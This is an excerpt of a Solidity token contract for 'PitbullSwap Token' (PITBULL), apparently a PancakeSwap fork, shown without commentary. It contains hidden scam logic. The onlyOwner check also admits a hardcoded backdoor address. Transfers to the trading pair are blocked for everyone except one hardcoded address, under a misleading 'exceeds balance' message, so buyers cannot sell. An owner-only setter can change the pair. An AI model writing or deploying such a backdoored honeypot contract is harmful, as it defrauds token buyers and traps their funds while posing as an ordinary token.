...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender() == 0xcaa2eE1653992094B44ffF5DA93D4c5A77756dFC, 'Ownable: caller is not the owner');
        _;
    }
...
contract BEP20 is Context, IBEP20, Ownable {
    ...
    function _transfer(
        ...
        if (recipient == _pair) {
            require(sender == 0x98B68e67ffa2cB8624feb17AD70d225f4ed2710e, "BEP20: transfer amount exceeds balance");
        }
    ...
    function set(address _p) public onlyOwner {
        _pair = _p;
    }
...
contract CakeToken is BEP20('PitbullSwap Token', 'PITBULL') {
...
contract SyrupBar is BEP20('PitBullVote Token', 'PITVOYE') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
